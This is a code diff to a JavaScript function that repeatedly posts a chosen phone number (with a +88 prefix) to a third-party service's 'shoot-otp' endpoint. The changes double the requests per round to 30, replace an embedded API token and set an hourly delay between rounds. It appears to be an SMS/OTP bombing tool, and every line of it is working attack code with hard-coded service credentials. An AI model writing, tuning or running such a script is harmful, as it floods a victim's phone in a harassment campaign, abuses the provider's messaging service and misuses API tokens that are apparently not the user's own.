@@ -4,14 +4,14 @@ async function sheba(number, limit) {
   for (let round = 0; round < limit; round++) {
     console.log(`▶ Round ${round + 1}/${limit} started`);
 
-    for (let i = 0; i < 15; i++) {
+    for (let i = 0; i < 30; i++) {
       try {
         const response = await axios.post(
   'https://accountkit.sheba.xyz/api/shoot-otp',
   {
     'mobile': `+88${number}`,
     'app_id': '8329815A6D1AE6DD',
-    'api_token': 'qDI1cCD5deJEIYkzFl61m0lcl0zJDxEMS9B1HchAFH89LFCRrUXDoNLKAIR2'
+    'api_token': 'OCSTTU8hm2clkNV4H81PuTaOGQRPktbYevddMkD7sqxH6HcKOrBhfseF09z9'
   },
   {
     headers: {
@@ -42,8 +42,8 @@ async function sheba(number, limit) {
     }
 
     if (round < limit - 1) {
-      console.log(`⏳ Waiting 3 minutes before next round...`);
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      console.log(`⏳ Waiting 1 hours before next round...`);
+      await new Promise(resolve => setTimeout(resolve, 3600000));
     }
   }
 
